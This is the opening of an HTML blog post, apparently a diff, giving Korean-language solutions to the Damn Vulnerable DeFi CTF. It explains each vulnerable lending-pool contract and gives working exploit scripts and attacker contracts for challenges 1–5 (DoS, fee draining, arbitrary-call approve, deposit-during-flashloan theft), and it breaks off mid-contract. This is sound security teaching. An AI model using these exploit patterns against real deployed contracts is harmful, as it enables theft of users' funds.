+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://inhack.github.io/kr/" title="Korean"
+                            aria-label=":kr:">🇰🇷</a>
+                    </li>
+                </ul>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://inhack.github.io/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://inhack.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://inhack.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://inhack.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://inhack.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://inhack.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      [Solution] Damn Vulnerable DeFi
+    </h1>
+    <div class="post-description">
+      Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions
+    </div>
+    <div class="post-meta"><span title='2022-01-11 00:00:00 +0000 UTC'>January 11, 2022</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;inhack&nbsp;|&nbsp;
+<ul class="i18n_list">Translations:
+    <li>
+        <a href="https://inhack.github.io/kr/posts/solution-damn-vulnerable-defi/">🇰🇷</a>
+    </li>
+</ul>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#-1-unstoppable" aria-label="# 1. Unstoppable"># 1. Unstoppable</a><ul>
+                        
+                <li>
+                    <a href="#summary" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-2-naive-receiver" aria-label="# 2. Naive receiver"># 2. Naive receiver</a><ul>
+                        
+                <li>
+                    <a href="#summary-1" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-1" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-3---truster" aria-label="# 3. - Truster"># 3. - Truster</a><ul>
+                        
+                <li>
+                    <a href="#summary-2" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-2" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-4-side-entrance" aria-label="# 4. Side entrance"># 4. Side entrance</a><ul>
+                        
+                <li>
+                    <a href="#summary-3" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-3" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-5-the-rewarder" aria-label="# 5. The rewarder"># 5. The rewarder</a><ul>
+                        
+                <li>
+                    <a href="#summary-4" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-4" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-6-selfie" aria-label="# 6. Selfie"># 6. Selfie</a><ul>
+                        
+                <li>
+                    <a href="#summary-5" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-5" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-7-compromised" aria-label="# 7. Compromised"># 7. Compromised</a><ul>
+                        
+                <li>
+                    <a href="#summary-6" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-6" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-8-puppet" aria-label="# 8. Puppet"># 8. Puppet</a><ul>
+                        
+                <li>
+                    <a href="#summary-7" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-7" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-9-puppet-v2" aria-label="# 9. Puppet v2"># 9. Puppet v2</a><ul>
+                        
+                <li>
+                    <a href="#summary-8" aria-label="Summary">Summary</a></li>
+                <li>
+                    <a href="#exploit-8" aria-label="Exploit">Exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#-10-free-rider" aria-label="# 10. Free rider"># 10. Free rider</a></li>
+                <li>
+                    <a href="#-11-backdoor" aria-label="# 11. Backdoor"># 11. Backdoor</a></li>
+                <li>
+                    <a href="#-12-climber" aria-label="# 12. Climber"># 12. Climber</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><hr>
+<p><a href="https://www.damnvulnerabledefi.xyz/"><strong><em>&lsquo;Damn Vulnerable DeFi&rsquo;</em></strong></a> is an offensive security playground for decentralized finances.</p>
+<p>This article offers a brief summary and exploit code of each challenge.</p>
+<p>For detailed source code and contents, please check my github repository.</p>
+<hr>
+<h2 id="-1-unstoppable"># 1. Unstoppable<a hidden class="anchor" aria-hidden="true" href="#-1-unstoppable">#</a></h2>
+<h3 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h3>
+<p>Flash Loan을 제공하고 있는 Lending Pool을 대상으로 DoS 공격을 통해 기능을 멈추게하는 것이 목표이다.</p>
+<p><strong>Flash Loan?</strong></p>
+<blockquote>
+<p>Flash Loan은 간단하게 설명하자면 &lsquo;무담보&rsquo; 대출로, 보통 사용자는 대출 풀에 소정의 수수료를 지급하고(물론 트랜잭션 실행에 대한 가스비도 소모) 토큰을 대출할 수 있다.</p>
+<p>대출한 토큰을 가지고 다른 DeFi 서비스에 투자를 하던, 에어드랍 보상을 위한 스테이킹을 하던, 사용자가 상환 이전까지 사용할 수 있다.</p>
+<p>하지만 Flash Loan의 대출-상환 프로세스는 &lsquo;단일&rsquo; 트랜잭션에서 이루어져야 하며, 상환 과정에서 대출받은 토큰만큼의 수량을 Pay Back하지 않는 경우 해당 트랜잭션이 revert된다.</p>
+<p>revert가 된다는 것은 해당 트랜잭션이 블록에 포함되지 않아 PoW/PoS 등의 거래증명이 완료되지 않기 때문에, State Transition이 발생하지 않는다.</p>
+<p>말이 어려운데 그냥 원금을 돌려놓지 않으면, 대출-상환 사이에 토큰을 옮기든 무엇을 하든 트랜잭션 revert로 인해 대출 실행 이전의 상태로 원복된다는 것이다.(수수료나 가스비만 소모)</p>
+</blockquote>
+<p>이더리움에서는 계정(컨트랙트 및 EOA)을 대상으로 강제로 Ether를 송신할 수 있으므로</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#66d9ef">uint256</span> balanceBefore <span style="color:#f92672">=</span> damnValuableToken.balanceOf(<span style="color:#66d9ef">address</span>(this));
+require(balanceBefore <span style="color:#f92672">&gt;=</span> borrowAmount, <span style="color:#e6db74">&#34;Not enough tokens in pool&#34;</span>);
+
+<span style="color:#75715e">// Ensured by the protocol via the `depositTokens` function
+</span><span style="color:#75715e"></span>assert(poolBalance <span style="color:#f92672">==</span> balanceBefore);
+</code></pre></div><p>와 같이 컨트랙트의 balance를 엄격하게 확인하는 코드를 작성하는 경우에 주의해야 한다.</p>
+<p>위 코드로 인해 Lending Pool의 계좌 잔액이 1 wei만 늘어나더라도, <code>assert()</code>에 의해 이후의 코드가 실행되지 않는 DoS 상태로 빠질 수 있다.</p>
+<h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
+<p><strong>unstoppable.challenge.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#ae81ff">1</span>);      <span style="color:#75715e">// forcibly send 1 wei to lending pool
+</span></code></pre></div><hr>
+<h2 id="-2-naive-receiver"># 2. Naive receiver<a hidden class="anchor" aria-hidden="true" href="#-2-naive-receiver">#</a></h2>
+<h3 id="summary-1">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-1">#</a></h3>
+<p>Flash Loan을 제공하는 Lending Pool에서 대출 수수료로 1 ETH를 청구한다. 해당 Lending Pool을 이용하는 특정 사용자의 balance(10 ETH)를 drain하는 것이 목표이다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// NaiveReceiverLenderPool.sol
+</span><span style="color:#75715e"></span>...
+<span style="color:#75715e">// msg.sender가 borrower인지 검증하는 로직이 없음 -&gt; 공격자가 임의의 사용자의 컨트랙트에 있는 잔고를 고갈시킬 수 있음(수수료 사용)
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">address</span> borrower, <span style="color:#66d9ef">uint256</span> borrowAmount) <span style="color:#66d9ef">external</span> nonReentrant {
+    <span style="color:#75715e">// (1) Flash Loan 컨트랙트의 잔액이 borrowAmount에 비해 충분한지 확인
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint256</span> balanceBefore <span style="color:#f92672">=</span> <span style="color:#66d9ef">address</span>(this).balance;
+    require(balanceBefore <span style="color:#f92672">&gt;=</span> borrowAmount, <span style="color:#e6db74">&#34;Not enough ETH in pool&#34;</span>);
+
+    <span style="color:#75715e">// (2) 대출자인 borrower가 컨트랙트인지 확인(not EOA)
+</span><span style="color:#75715e"></span>    require(borrower.isContract(), <span style="color:#e6db74">&#34;Borrower must be a deployed contract&#34;</span>);
+
+    <span style="color:#75715e">// borrower.receiveEther() 호출
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Transfer ETH and handle control to receiver
+</span><span style="color:#75715e"></span>    borrower.functionCallWithValue(
+        abi.encodeWithSignature(
+            <span style="color:#e6db74">&#34;receiveEther(uint256)&#34;</span>,
+            FIXED_FEE
+        ),
+        borrowAmount
+    );
+    
+    require(
+        <span style="color:#66d9ef">address</span>(this).balance <span style="color:#f92672">&gt;=</span> balanceBefore <span style="color:#f92672">+</span> FIXED_FEE,
+        <span style="color:#e6db74">&#34;Flash loan hasn&#39;t been paid back&#34;</span>
+    );
+}
+...
+</code></pre></div><p>위 코드를 보면 확인할 수 있듯이, <code>flashLoan()</code> 을 호출하여 대출을 실행하는 사용자인 <code>msg.sender</code>가 <code>borrower</code>인지 검증하는 로직이 없어, 공격자가 임의의 사용자 주소를 <code>borrower</code>에 입력하여 호출이 가능하다.</p>
+<h3 id="exploit-1">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-1">#</a></h3>
+<p><strong>naive-receiver.challenge.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">10</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+    <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">receiver</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">parseEther</span>(<span style="color:#e6db74">&#39;0&#39;</span>));
+}
+</code></pre></div><hr>
+<h2 id="-3---truster"># 3. - Truster<a hidden class="anchor" aria-hidden="true" href="#-3---truster">#</a></h2>
+<h3 id="summary-2">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-2">#</a></h3>
+<p>Flash Loan을 기반으로 DTV 토큰을 무료로 대출해주는 Lending Pool이 있으며, 해당 Lending Pool은 100만개의 DTV 토큰을 가지고 있다.
+해당 Lending Pool로부터 모든 DTV 토큰을 공격자의 계정으로 옮기는 것이 목표이다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity">...
+<span style="color:#75715e">// functionCall()을 이용하여 target 컨트랙트의 및 특정 함수를 호출하는 코드로 인해, 공격자는 어떠한 함수든 호출이 가능
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(
+        <span style="color:#66d9ef">uint256</span> borrowAmount,
+        <span style="color:#66d9ef">address</span> borrower,
+        <span style="color:#66d9ef">address</span> target,
+        <span style="color:#66d9ef">bytes</span> calldata data
+    )
+        <span style="color:#66d9ef">external</span>
+        nonReentrant
+    {
+        <span style="color:#66d9ef">uint256</span> balanceBefore <span style="color:#f92672">=</span> damnValuableToken.balanceOf(<span style="color:#66d9ef">address</span>(this));
+        require(balanceBefore <span style="color:#f92672">&gt;=</span> borrowAmount, <span style="color:#e6db74">&#34;Not enough tokens in pool&#34;</span>);
+        
+        damnValuableToken.transfer(borrower, borrowAmount);
+        target.functionCall(data);      <span style="color:#75715e">// Vulnerable : target 및 data를 이용해 함수 호출 -&gt; 어떠한 함수든 호출이 가능한 상황
+</span><span style="color:#75715e"></span>
+        <span style="color:#66d9ef">uint256</span> balanceAfter <span style="color:#f92672">=</span> damnValuableToken.balanceOf(<span style="color:#66d9ef">address</span>(this));
+        require(balanceAfter <span style="color:#f92672">&gt;=</span> balanceBefore, <span style="color:#e6db74">&#34;Flash loan hasn&#39;t been paid back&#34;</span>);
+    }
+...
+</code></pre></div><p><code>target.functionCall(data);</code> 에 의해 현재 어떠한 함수든 사용자가 호출이 가능한 상황이다.</p>
+<p><code>require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn't been paid back&quot;);</code> 구문 우회를 위해, <code>approve()</code> 함수를 호출하도록하여 Lending Pool-&gt;공격자로 토큰 전송을 승인해두고 <code>flashLoan()</code> 호출 이후에 <code>transferFrom()</code>을 이용해 Lending Pool의 모든 토큰을 공격자의 계정으로 가져올 수 있다.</p>
+<h3 id="exploit-2">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-2">#</a></h3>
+<p><strong>truster.challenge.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ABI</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;function approve(address, uint256)&#34;</span>];
+<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">interface</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">Interface</span>(<span style="color:#a6e22e">ABI</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">interface</span>.<span style="color:#a6e22e">encodeFunctionData</span>(<span style="color:#e6db74">&#34;approve&#34;</span>, [<span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">TOKENS_IN_POOL</span>.<span style="color:#a6e22e">toString</span>()]);
+
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">flashLoan</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">payload</span>);          <span style="color:#75715e">// token.approve() : lending pool -&gt; attacker
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">connect</span>(<span style="color:#a6e22e">attacker</span>).<span style="color:#a6e22e">transferFrom</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">TOKENS_IN_POOL</span>);
+</code></pre></div><hr>
+<h2 id="-4-side-entrance"># 4. Side entrance<a hidden class="anchor" aria-hidden="true" href="#-4-side-entrance">#</a></h2>
+<h3 id="summary-3">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-3">#</a></h3>
+<p>누구나,언제든 ETH를 예치/인출할 수 있는 Lending Pool이 있다.</p>
+<p>해당 Lending Pool은 1,000 ETH의 balance를 가지고 있으며, 프로모션으로 예치된 ETH를 자유롭게 대출할 수 있는 Flash Loan 서비스를 제공하고 있다.</p>
+<p>공격자는 해당 Lending Pool로부터 모든 ETH를 가져와야 한다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SideEntranceLenderPool
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">SideEntranceLenderPool</span> {
+    <span style="color:#f92672">using</span> Address <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span>;
+
+    <span style="color:#66d9ef">mapping</span> (<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint256</span>) <span style="color:#66d9ef">private</span> balances;
+
+    <span style="color:#75715e">// ETH deposit(예치) 기능 제공
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Vulnerable : ETH 수신 여부와 상관없이 balance를 증가시킴
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">deposit</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+        balances[msg.sender] <span style="color:#f92672">+=</span> msg.value;
+    }
+
+    <span style="color:#75715e">// ETH withdraw(인출) 기능 제공
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#66d9ef">external</span> {
+        <span style="color:#66d9ef">uint256</span> amountToWithdraw <span style="color:#f92672">=</span> balances[msg.sender];
+        balances[msg.sender] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        <span style="color:#66d9ef">payable</span>(msg.sender).sendValue(amountToWithdraw);
+    }
+
+    <span style="color:#75715e">/**
+</span><span style="color:#75715e">     * @notice Flash Loan 기능으로 사용자에게 원하는 만큼의 ETH를 대출
+</span><span style="color:#75715e">     * @param amount 대출할 ETH의 수량
+</span><span style="color:#75715e">     * @dev 대출을 요청한 사용자 컨트랙트의 execute() 함수를 호출 -&gt; execute
+</span><span style="color:#75715e">     */</span>
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> {
+        <span style="color:#66d9ef">uint256</span> balanceBefore <span style="color:#f92672">=</span> <span style="color:#66d9ef">address</span>(this).balance;
+        require(balanceBefore <span style="color:#f92672">&gt;=</span> amount, <span style="color:#e6db74">&#34;Not enough ETH in balance&#34;</span>);
+        
+        IFlashLoanEtherReceiver(msg.sender).execute{value<span style="color:#f92672">:</span> amount}();
+
+        require(<span style="color:#66d9ef">address</span>(this).balance <span style="color:#f92672">&gt;=</span> balanceBefore, <span style="color:#e6db74">&#34;Flash loan hasn&#39;t been paid back&#34;</span>);        
+    }
+}
+</code></pre></div><p>대출을 요청한 사용자 컨트랙트의 <code>execute()</code> 함수를 실행하며, <code>msg.value</code>를 통해 대출한 ETH 토큰을 전달한다.</p>
+<p>deposit() 함수는 ETH를 사용자에게 수신했는지 여부와 상관없이 balance를 증가시키도록 취약한 형태로 작성되어 있다.</p>
+<p>공격자는 내부적으로 <code>deposit()</code>을 호출하여 대출한 ETH를 Lending Pool에 예치하는 <code>execute()</code> 함수 및 컨트랙트를 호출한 뒤, <code>flashLoan()</code> 실행이 종료된 이후에 <code>withdraw()</code>를 통해 ETH를 가져올 수 있다.</p>
+<ul>
+<li>(1) <code>flashLoan()</code>을 통해 대출한 ETH를 다시 <code>deposit()</code>하여 공격자의 balances를 증가시킨다.
+<ul>
+<li><code>deposit()</code>이 예치한 사용자의 ETH 전송 여부는 확인하지 않기 때문에, 대출한 토큰으로 balances만 증가시키고 다시 상환</li>
+</ul>
+</li>
+<li>(2) 공격자는 <code>withdraw()</code>를 호출하여 Lending Pool의 ETH를 가져온다.</li>
+</ul>
+<h3 id="exploit-3">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-3">#</a></h3>
+<p><strong>attacker-contracts/FlashLoanEtherReceiver.sol</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;../side-entrance/SideEntranceLenderPool.sol&#34;</span>;
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">FlashLoanEtherReceiver</span> {
+    SideEntranceLenderPool <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">immutable</span> pool;
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">immutable</span> attacker;
+
+    <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> poolAddress, <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> attackerAddress) {
+        pool <span style="color:#f92672">=</span> SideEntranceLenderPool(poolAddress);
+        attacker <span style="color:#f92672">=</span> attackerAddress;
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">execute</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+        pool.deposit{value<span style="color:#f92672">:</span> msg.value}();
+    }
+
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">executeFlashLoan</span>() <span style="color:#66d9ef">external</span> {
+        <span style="color:#75715e">// attack -&gt; increase attacker&#39;s balances
+</span><span style="color:#75715e"></span>        pool.flashLoan(<span style="color:#66d9ef">address</span>(pool).balance);
+        pool.withdraw();
+
+        <span style="color:#75715e">// send drained ether to attacker
+</span><span style="color:#75715e"></span>        attacker.transfer(<span style="color:#66d9ef">address</span>(this).balance);
+    }
+
+    <span style="color:#75715e">// Allow deposits of ETH
+</span><span style="color:#75715e"></span>    receive () <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
+}
+</code></pre></div><p><strong>side-entrance.challenge.js</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FlashLoanEtherReceiver</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">ethers</span>.<span style="color:#a6e22e">getContractFactory</span>(<span style="color:#e6db74">&#39;FlashLoanEtherReceiver&#39;</span>, <span style="color:#a6e22e">attacker</span>);
+<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">receiver</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">FlashLoanEtherReceiver</span>.<span style="color:#a6e22e">deploy</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pool</span>.<span style="color:#a6e22e">address</span>, <span style="color:#a6e22e">attacker</span>.<span style="color:#a6e22e">address</span>);
+
+<span style="color:#66d9ef">await</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">receiver</span>.<span style="color:#a6e22e">executeFlashLoan</span>();
+</code></pre></div><hr>
+<h2 id="-5-the-rewarder"># 5. The rewarder<a hidden class="anchor" aria-hidden="true" href="#-5-the-rewarder">#</a></h2>
+<h3 id="summary-4">Summary<a hidden class="anchor" aria-hidden="true" href="#summary-4">#</a></h3>
+<p>DTV 토큰을 예치한 사용자에게 5일마다 한번씩 리워드 토큰을 보상해주는 Reward Pool이 있다. (라운드마다 100개의 리워드 토큰을 보상하며, 예치한 비율에 따라 분배)</p>
+<p>현재 Alice, Bob, Charile, David 4명이 사용자가 각각 100개의 DTV 토큰을 예치한 상태이며, Reward Round 2에서 각각 25개씩의 Reward를 수령하였다.</p>
+<p>공격자는 DTV 토큰을 하나도 가지고 있지 않은 상태에서, Reward Round 3에서 가장 많은 Reward Token을 수령하는 것이 목표이다.</p>
+<p>100만개의 DTV 토큰을 보유하고 있는 FlashLoanderPool로부터 대출받은 토큰을 Reward Pool에 예치하여 리워드 토큰을 수령하면 된다.</p>
+<h3 id="exploit-4">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit-4">#</a></h3>
+<p><strong>attacker-contracts/FlashLoanTheRewarder.sol</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-solidity" data-lang="solidity"><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+
+<span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span>;
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IFlashLoanerPool</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashLoan</span>(<span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span>;
+}
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IDamnValuableToken</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">approve</span>(<span style="color:#66d9ef">address</span> spender, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> recipient, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
+}
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IRewarderPool</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">deposit</span>(<span style="color:#66d9ef">uint256</span> amountToDeposit) <span style="color:#66d9ef">external</span>;
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#66d9ef">uint256</span> amountToWithdraw) <span style="color:#66d9ef">external</span>;
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">distributeRewards</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
+}
+
+<span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IRewardToken</span> {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> recipient, <span style="color:#66d9ef">uint256</span> amount) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint256</span>);
+}
+
+<span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">FlashLoanTheRewarder</span> {
+    <span style="color:#f92672">using</span> Address <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span>;
+
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> lenderPool;
+    <span style="color:#75715e">//address payable private liquidityToken;
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> rewarderPool;
+    <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">private</span> attacker;
